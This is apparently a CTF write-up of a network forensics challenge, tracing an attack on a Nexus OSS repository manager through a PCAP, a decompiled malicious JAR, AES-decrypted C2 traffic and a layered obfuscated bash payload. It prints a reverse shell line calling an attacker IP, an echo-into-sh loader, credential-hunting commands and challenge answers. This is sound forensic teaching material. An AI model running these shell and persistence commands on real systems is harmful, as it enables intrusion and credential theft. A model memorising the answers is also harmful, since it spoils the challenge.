---
layout: post
title: "The Nexus Breach: Forensics Challenge — Global Cyber Skills Benchmark CTF 2025"
date: 2025-05-23
categories: [ctf]
tags: [pcap, wireshark, java, reverse-engineering, aes, nexus, network-forensics, dfir]
description: "Full writeup for The Nexus Breach forensics challenge from the Global Cyber Skills Benchmark CTF 2025 — analyzing a malicious PCAP to uncover a Nexus OSS supply chain attack involving Java malware, AES-encrypted C2 traffic, and multi-layer obfuscated reverse shell payloads."
---

A forensics challenge involving network traffic analysis, Java reverse engineering, and AES-encrypted C2 communication targeting a Nexus OSS repository manager.

## Description

> In an era fraught with cyber threats, Talion "Byte Doctor" Reyes, a former digital forensics examiner for an international crime lab, has uncovered evidence of a breach targeting critical systems vital to national infrastructure. Subtle traces of malicious activity point to a covert operation orchestrated by the Empire of Volnaya, a nation notorious for its expertise in cyber sabotage and hybrid warfare tactics.
>
> The breach threatens to disrupt essential services that Task Force Phoenix relies on in its ongoing fight against the expansion of the Empire of Volnaya. The attackers have exploited vulnerabilities in interconnected systems, employing sophisticated techniques to evade detection and trigger widespread disruption.
>
> Can you analyze the digital remnants left behind, reconstruct the attack timeline, and uncover the full extent of the threat?

## Skills Required

- Familiarity with analyzing network traffic
- Analyzing and understanding logic behind Java/Bash obfuscated code
- Analyzing and detecting custom attacks

---

## Enumeration

The following file is provided:
- `capture.pcap`

The file contains network traffic, more specifically:
- HTTP traffic on port 8081 (default Nexus OSS port)
- TCP encrypted traffic (port 4444)

---

## Q1 — Which credentials were used to login on the platform? (e.g. `username:password`)

Wireshark is used to analyze the pcap. Filter and look for the login endpoint using:

```
http.response.code eq 200 && http.request.uri contains "/login"
```

The HTTP request contains an `Authorization: Basic` header with a base64-encoded value. Decode it to reveal the credentials.

![Q1 - Login request and base64 decode](/assets/images/ctf/phantom-breach/q1-login-request.png)

**Answer: `administrator:UA16k51hiIHnDIuLs0`**

---

## Q2 — Which Nexus OSS version is in use? (e.g. `1.10.0-01`)

Within the same HTTP stream, look for the server response header after a successful request. The `Server` header in the HTTP response reveals the version.

![Q2 - Nexus version in HTTP response](/assets/images/ctf/phantom-breach/q2-nexus-version.png)

**Answer: `2.15.1-02`**

---

## Q3 — The attacker created a new user for persistence. Which credentials were set? (e.g. `username:password`)

Within the same HTTP stream, look for the `/users` endpoint. This endpoint is called via a `POST` request. The request body contains a JSON object with the new user's information.

![Q3 - POST /users request creating backdoor account](/assets/images/ctf/phantom-breach/q3-users-post.png)

**Answer: `adm1n1str4t0r:46vaGuj566`**

---

## Q4 — One core library written in Java has been tampered and replaced by a malicious one. Which is its package name? (e.g. `com.company.name`)

List all HTTP endpoints called using `tshark`:

```bash
tshark -2 -r capture.pcap -Y "http.request" -T fields -e http.request.uri | sort -u
```

Output:
```
/nexus/service/local/authentication/login
/nexus/service/local/repositories/releases/content/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/releases/content//.nexus/attributes/com/artsploit/nexus-rce/maven-metadata.xml
/nexus/service/local/repositories/snapshots/content/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar
/nexus/service/local/status
/nexus/service/local/users
```

A suspicious entry stands out: `PhoenixCyberToolkit-1.0.jar`. Filter for `.jar` requests in Wireshark and follow the HTTP stream.

```
http.request.uri contains ".jar"
```

A **PUT request** uploads a malicious `.jar` file to the Nexus Repository Manager at `phoenix.htb:8081`. This is typical Nexus artifact upload behavior — but only if authentication and permissions are valid.

![Q4 - PUT request uploading malicious JAR](/assets/images/ctf/phantom-breach/q4-jar-upload.png)

The HTTP body also contains embedded **Velocity Template code** (Velocity Injection), which is the Nexus server's template engine being abused for remote code execution:

![Q4 - Velocity template injection payload](/assets/images/ctf/phantom-breach/q4-velocity.png)

Export the file `PhoenixCyberToolkit-1.0.jar` from the HTTP stream using `File > Export Objects > HTTP` in Wireshark, then decompile using **JD-GUI**.

The package name is visible in the decompiled class structure:

![Q4 - JD-GUI showing com.phoenix.toolkit package](/assets/images/ctf/phantom-breach/q4-jdgui.png)

**Answer: `com.phoenix.toolkit`**

---

## Q5 — The tampered library contains encrypted communication logic. What is the secret key used for session encryption? (e.g. `Secret123`)

Analysis of the decompiled code reveals AES encryption with a multi-layer obfuscated key. The following Python script reconstructs the key by replicating the Java logic:

```python
import base64

# Step 1: XOR cipher (Java's xYzWq8 equivalent)
def xYzWq8(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

# Step 2: Decode a variable (Java's fGhJk6 equivalent)
def fGhJk6(b64_encoded: bytes, key: int) -> str:
    raw = base64.b64decode(b64_encoded)
    return xYzWq8(raw, key).decode()

# Step 3: Build the encoded variables (pKzLq7, etc.)
def make_encoded_var(original: str, key: int) -> bytes:
    return base64.b64encode(xYzWq8(original.encode(), key))

# Build the four encoded blobs exactly as the Java source does
pKzLq7 = make_encoded_var("3t9834", 55)
wYrNb2 = make_encoded_var("s3cr",   77)
xVmRq1 = make_encoded_var("354r",   23)
aDsZx9 = make_encoded_var("34",     42)

# Step 4: mNoPq5() — assemble cWlNz5 array
cWlNz5 = [
    fGhJk6(pKzLq7, 55),  # index 0 → "3t9834"
    fGhJk6(wYrNb2, 77),  # index 1 → "s3cr"
    fGhJk6(xVmRq1, 23),  # index 2 → "354r"
    fGhJk6(aDsZx9, 42),  # index 3 → "34"
]

# Step 5: Reverse the array using nQoMf6 = {3,2,1,0}
nQoMf6 = [3, 2, 1, 0]
pre_obfuscated_key = "".join(cWlNz5[i] for i in nQoMf6)

# Step 6: gDF5a() — final character-level obfuscation
def gDF5a(s: str) -> str:
    result = ""
    for c in s:
        yTR8v = (((ord(c) ^ 7) + 33) % 94) + 33
        result += chr(yTR8v)
    return result

final_secret_key = gDF5a(pre_obfuscated_key)

print(f"PRE-OBFUSCATED KEY : {pre_obfuscated_key}")
print(f"FINAL SECRET KEY   : {final_secret_key}")
```

Output:
```
PRE-OBFUSCATED KEY : 34354rs3cr3t9834
FINAL SECRET KEY   : vuvtuYXvHYvW"#vu
```

**Answer: `vuvtuYXvHYvW"#vu`**

---

## Learning Section — Reconstructing an Obfuscated Secret Key (Step-by-Step)

When analyzing malware, CTF challenges, or heavily obfuscated Java applications, hidden strings often do not appear in plaintext. Instead of storing secrets directly, attackers use multiple layers of obfuscation to reconstruct them only at runtime.

### Why Obfuscate a Secret Key?

The main goal is to hide sensitive values such as:
- Passwords
- API keys
- Encryption keys
- Command-and-control (C2) secrets

By splitting the secret, encoding it, and rebuilding it dynamically, the key is protected from:
- Simple `strings` extraction
- Static analysis
- Quick reverse engineering

### Step 1: XOR + Base64 (Initial Obfuscation)

Each part of the secret is first XOR-encoded using a numeric key, then Base64-encoded to make it look harmless. In Python:

```python
def xYzWq8(data, key):
    return bytes(b ^ key for b in data)
```

XOR is reversible — applying the same key again recovers the original data.

### Step 2: Decoding the Hidden Fragments

To recover the original values, the process is reversed (Base64 decode → XOR):

```python
def fGhJk6(b64_encoded, key):
    raw = base64.b64decode(b64_encoded)
    return xYzWq8(raw, key).decode()
```

After decoding, the hidden fragments become: `"3t9834"`, `"s3cr"`, `"354r"`, `"34"`

These values are stored in an array: `cWlNz5 = ["3t9834", "s3cr", "354r", "34"]`

At this stage, the full secret is still not visible.

### Step 3: Reordering the Array

Instead of combining the fragments in their original order, the code uses a custom index array:

`nQoMf6 = [3, 2, 1, 0]`

The fragments are joined in reverse order: `"34" + "354r" + "s3cr" + "3t9834"`

`PRE-OBFUSCATED KEY = "34354rs3cr3t9834"`

### Step 4: Final Character-Level Obfuscation

The final transformation modifies each character individually:

```python
def gDF5a(s):
    result = ""
    for c in s:
        y = (((ord(c) ^ 7) + 33) % 94) + 33
        result += chr(y)
    return result
```

Each character is XORed with `7`, shifted into printable ASCII range, and converted to a new character. The final output cannot be guessed by visual inspection.

**Final Result:**
```
Pre-obfuscated key : 34354rs3cr3t9834
Final secret key   : vuvtuYXvHYvW"#vu
```

---

## Q6 — Which is the name of the function that manages the AES string decryption process? (e.g. `aVf41`)

From the decompiled Java code, the relevant part handling AES decryption is:

```java
private static String uJtXq5(String kVzNy4, String pWlXq7) throws Exception {
    SecretKeySpec bFyMp6 = new SecretKeySpec(pWlXq7.getBytes(StandardCharsets.UTF_8), "AES");
    Cipher tZrXq9 = Cipher.getInstance("AES");
    tZrXq9.init(2, bFyMp6);
    return new String(tZrXq9.doFinal(Base64.getDecoder().decode(kVzNy4)));
}
```

This function:
- Accepts an encrypted Base64-encoded string and a secret key
- Decrypts it using AES
- Returns the plaintext string

**Answer: `uJtXq5`**

---

## Q7 — Which is the system command that triggered the reverse shell execution? (e.g. `"java .... &"`)

From the tampered JAR execution shown in the Velocity template injection earlier, the command used to launch it is:

```bash
java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &
```

This is the **initial execution command**. The reverse shell itself is spawned **by the JAR**, not directly by this command.

**Answer: `java -jar /sonatype-work/storage/snapshots/com/phoenix/toolkit/1.0/PhoenixCyberToolkit-1.0.jar &`**

---

## Q8 — Which is the first executed command in the encrypted reverse shell session? (e.g. `whoami`)

The encrypted session traffic is found on port 4444. Save all base64-encoded blobs line by line to `blobs.txt`.

![Q8 - Encrypted C2 traffic blobs in Wireshark](/assets/images/ctf/phantom-breach/q8-encrypted-blobs.png)

Create `decrypt.py` and run it against `blobs.txt`:

```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# The secret key recovered from Java deobfuscation
KEY = 'vuvtuYXvHYvW"#vu'.encode()  # 16 bytes = AES-128

def aes_ecb_decrypt(ciphertext_bytes):
    cipher = Cipher(algorithms.AES(KEY), modes.ECB(), backend=default_backend())
    dec = cipher.decryptor()
    raw = dec.update(ciphertext_bytes) + dec.finalize()
    try:
        unpadder = padding.PKCS7(128).unpadder()
        raw = unpadder.update(raw) + unpadder.finalize()
    except Exception:
        pass
    return raw.decode('utf-8', errors='replace').strip()

with open('blobs.txt', 'r') as f:
    blobs = [line.strip() for line in f if line.strip()]

print("=" * 60)
print("DECRYPTED OUTPUT")
print("=" * 60)
for i, b64 in enumerate(blobs):
    raw_bytes = base64.b64decode(b64)
    if len(raw_bytes) % 16 != 0:
        print(f"[{i:02d}] SKIP (not block-aligned, {len(raw_bytes)} bytes)")
        continue
    result = aes_ecb_decrypt(raw_bytes)
    if result:
        print(f"[{i:02d}] >>> {result}")
```

The first decrypted command from the session is `uname -a`.

**Answer: `uname -a`**

---

## Full Decrypted Attack Session

### Phase 1 — Reconnaissance

| Blob | Type | Decrypted Content |
|------|------|-------------------|
| 00 | CMD | `uname -a` |
| 01 | OUT | `Linux phoenix-repo 5.15.0-134-generic #145-Ubuntu SMP Wed Feb 12 20:08:39 UTC 2025 x86_64` |
| 02 | CMD | `find / -name "sonatype-work" -type d` |

The first action is running `uname -a` — confirming the OS and kernel. This is followed immediately by locating the Nexus data directory, confirming the attacker already knows what software is installed.

### Phase 2 — Credential Hunting

| Blob | CMD | Purpose |
|------|-----|---------|
| 04 | `find /sonatype-work/storage/ -name "*.properties" \| xargs grep -l "password"` | Hunt password files |
| 06 | `find /sonatype-work/storage/ -name "*.xml" \| xargs grep -l "password"` | Hunt XML config credentials |
| 08 | `find /sonatype-work/ -name "*.bak"` | Look for backup files |
| 10–16 | `grep -r "secret/apikey/token/jdbc" /sonatype-work/` | Mass credential harvesting |

A methodical credential sweep across all file types — passwords, API keys, tokens, and database connection strings. This is a standard post-exploitation pattern for Nexus servers.

### Phase 3 — Directory Enumeration and File Exfiltration

| Blob | Type | Content |
|------|------|---------|
| 18 | CMD | `ls -la /sonatype-work/db/` |
| 21 | CMD | `ls -la /sonatype-work/conf/` |
| 22 | OUT | Config files: `nexus.xml`, `security.xml`, `security-configuration.xml`, `logback.xml` |
| 25 | CMD | `cat /sonatype-work/conf/nexus.xml` |
| 26 | OUT | Full `nexus.xml` — contains SMTP password hash |
| 27 | CMD | `cat /sonatype-work/conf/security.xml` |
| 28 | OUT | Full `security.xml` — all users and password hashes |
| 29 | CMD | `cat /sonatype-work/conf/security-configuration.xml` |

### Sensitive Data Exfiltrated

| File | Sensitive Data | Value |
|------|---------------|-------|
| `nexus.xml` | SMTP password (Nexus-encrypted) | `{54rt3V07X8UH8dlJ212yaZXIshhmlUo3QS0vdZIw0vA=}` |
| `security-configuration.xml` | Anonymous password hash | `{N+kuSVsum00HpaxJeLNkJRKDBG9Le+YDfc4GN/4mMOY=}` |
| `security.xml` | All user password hashes (Shiro SHA-512) | 6 users |

---

## Q9 — Which other legit user has admin permissions on the Nexus instance (excluding `adm1n1str4t0r` and `admin`)? (e.g. `john_doe`)

### Analysing security.xml

The security.xml blob (the largest in the capture) decrypts to a full Nexus user database.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<security>
  <version>2.0.5</version>
  <users>
    <user>
      <id>deployment</id>
      <firstName>Deployment</firstName>
      <lastName>User</lastName>
      <password>b2a0e378437817cebdf753d7dff3dd75483af9e0</password>
      <status>active</status>
      <email>deployment@corp.htb</email>
    </user>
    <user>
      <id>anonymous</id>
      <firstName>Nexus</firstName>
      <lastName>Anonymous User</lastName>
      <password>$shiro1$SHA-512$1024$zVANUnbAR2sp7I00pquLIQ==$5u2+o6DUtQ46YOOnk3PVCEobyqNaq2It6Rpf/jq0Se3EtObgr+mTUOOfEPBzyfSeLJgQCdkCbWnJvE1sNLbQ0A==</password>
      <status>active</status>
      <email>anonymous@corp.htb</email>
    </user>
    <user>
      <id>john_smith</id>
      <firstName>john</firstName>
      <lastName>smith</lastName>
      <password>$shiro1$SHA-512$1024$rWbh6j+8PZjTJwmq5L1RbA==$NoNDVWu1XN90QAnLGaOQ7nMVa0kOH28mnRb+U4cKwaJzox1isD+zSsKR5oSgEtqJzHpO/ZNDLEdOTnNCrdwsSw==</password>
      <status>active</status>
      <email>john_smith@corp.htb</email>
    </user>
    <user>
      <id>brad_smith</id>
      <firstName>Brad</firstName>
      <lastName>Smith</lastName>
      <password>$shiro1$SHA-512$1024$KxTwUY7hJfejxH4Lu9IyJQ==$gyBhme+Ymn1aL4AWu3bT4invCu5KoI3m3OMbYKErJ4jMvjTM9ELxxn0Zd5Y7rFLxE2HlcCVY6ahRqVkm9yfgXA==</password>
      <status>active</status>
      <email>brad_smith@corp.htb</email>
    </user>
    <user>
      <id>admin</id>
      <firstName>Administrator</firstName>
      <lastName>User</lastName>
      <password>$shiro1$SHA-512$1024$qYmC+VGcNXGxoLo3jHZpQg==$PFPFYc9hoYxLzV4EZFIELz7dGiTSLUYGCpzBatrh91sM/PIU01CPwWGDDA7OumGKfsgNXr7p25hALKIlyZqmzg==</password>
      <status>active</status>
      <email>administrator@corp.htb</email>
    </user>
    <user>
      <id>adm1n1str4t0r</id>
      <firstName>Persistent</firstName>
      <lastName>Admin</lastName>
      <password>$shiro1$SHA-512$1024$0l24cxJgYeT+cx22Vcl14A==$KLQ1VE9OcjxoGjzH+uUmYUAFMHmTd9eIdgZE5T5Ten4MnNVYA8rn8wZptdNDmT0BHcK18N2ERz8/3kpaL0r7Lg==</password>
      <status>active</status>
      <email>adm1n1str4t0r@phoenix.htb</email>
    </user>
  </users>
  <userRoleMappings>
    <userRoleMapping>
      <userId>deployment</userId>
      <source>default</source>
      <roles>
        <role>repository-any-full</role>
        <role>nx-deployment</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>anonymous</userId>
      <source>default</source>
      <roles>
        <role>repository-any-read</role>
        <role>anonymous</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>john_smith</userId>
      <source>default</source>
      <roles>
        <role>nx-admin</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>brad_smith</userId>
      <source>default</source>
      <roles>
        <role>nx-developer</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>admin</userId>
      <source>default</source>
      <roles>
        <role>nx-admin</role>
      </roles>
    </userRoleMapping>
    <userRoleMapping>
      <userId>adm1n1str4t0r</userId>
      <source>default</source>
      <roles>
        <role>nx-admin</role>
      </roles>
    </userRoleMapping>
  </userRoleMappings>
</security>
```

The decrypted `security.xml` blob reveals the full Nexus user database:

| User ID | Role | Admin? | Email Domain | Password Format |
|---------|------|--------|--------------|----------------|
| `deployment` | nx-deployment | No | corp.htb | Plain SHA-1 (no salt!) |
| `anonymous` | repository-any-read | No | corp.htb | Shiro SHA-512 / 1024 iter |
| `john_smith` | **nx-admin** | **YES** | corp.htb | Shiro SHA-512 / 1024 iter |
| `brad_smith` | nx-developer | No | corp.htb | Shiro SHA-512 / 1024 iter |
| `admin` | nx-admin | YES | corp.htb | *(excluded)* |
| `adm1n1str4t0r` | nx-admin | YES | phoenix.htb | *(excluded)* |

> **Note:** `adm1n1str4t0r` uses the `@phoenix.htb` email domain instead of `@corp.htb` like all legitimate users — a clear indicator it was created by the attacker as a backdoor account, not a legitimate employee.
>
> Also notable: the `deployment` user has a plain unsalted SHA-1 hash — far weaker than the Shiro format and trivially crackable with a wordlist.

Excluding `admin` and `adm1n1str4t0r`, the only remaining user with `nx-admin` role is `john_smith`.

**Answer: `john_smith`**

---

## Q10 — The attacker wrote something in a specific file to maintain persistence. What is the full path? (e.g. `/path/file`)

The final blob in the capture contains the most interesting content: a **three-layer obfuscated shell payload** that plants a reverse shell backdoor on the system.

### Layer 1 — AES-ECB Decrypt → Base64 Encoded Bash

After AES-ECB decryption, the blob produces this shell one-liner:

```bash
echo "Z0g0PSJFZCI7..." | base64 --decode | sh
```

The attacker echoes a base64 string directly into `sh` for execution. The real payload is hidden inside the base64.

### Layer 2 — Decode Base64 → Obfuscated Bash

Decoding that base64 string gives a bash script full of meaningless variable names designed to confuse static analysis:

```bash
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" \
'=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCI...' \
| r";HxJ="s";Hc2="";f="as";kcE="pas";d="o";V9z="6";U=" -d"
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
```

When every variable is resolved, the `eval` statement assembles and runs:

```bash
echo '<reversed_b64_string>' | base64 -d
```

### Layer 3 — Reversed Base64 → Final Payload

The `s=` variable holds yet another base64 string — but stored **backwards**. The giveaway is that it starts with `=`, which is a padding character that should only appear at the **end** of a valid base64 string. After reversing and decoding:

```bash
# What is seen (reversed):
=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3...

# After reversing:
ZWNobyAiYmFzaCBtaSA+JiAvZGV2L3RjcC8x...

# After base64 decode — the REAL command:
echo "bash mi >& /dev/tcp/10.10.10.23/4444 0>&1" \
  > /sonatype-work/storage/.phoenix-updater \
  && chmod +x /sonatype-work/storage/.phoenix-updater
```

### What This Command Does

| Step | Command | Purpose |
|------|---------|---------|
| 1 | `echo "bash mi >& /dev/tcp/10.10.10.23/4444 0>&1"` | Writes a reverse shell one-liner — opens TCP connection back to attacker at `10.10.10.23:4444` |
| 2 | `> /sonatype-work/storage/.phoenix-updater` | Saves reverse shell to a **hidden file** (dot prefix hides it from `ls`); name chosen to blend in as a legitimate system updater |
| 3 | `chmod +x` | Makes the file executable so it can be triggered at any time |

> **Note:** A reverse shell works by making the victim call **out** to the attacker rather than the attacker connecting in. This bypasses inbound firewall rules, which is why attackers prefer this technique.

**Answer: `/sonatype-work/storage/.phoenix-updater`**

---

## Attack Timeline Summary

```
[1] Login using stolen credentials: administrator:UA16k51hiIHnDIuLs0
[2] Create backdoor admin account: adm1n1str4t0r:46vaGuj566
[3] Upload malicious JAR via Nexus API (PUT request)
[4] Trigger RCE via Apache Velocity template injection
[5] Execute JAR → establish AES-encrypted reverse shell on port 4444
[6] Reconnaissance: uname -a, locate Nexus data directory
[7] Credential harvesting: sweep all config files for passwords/tokens
[8] Exfiltrate: nexus.xml, security.xml, security-configuration.xml
[9] Plant persistence: write reverse shell to .phoenix-updater
```

---

*All analysis was performed in a controlled CTF environment for educational purposes.*
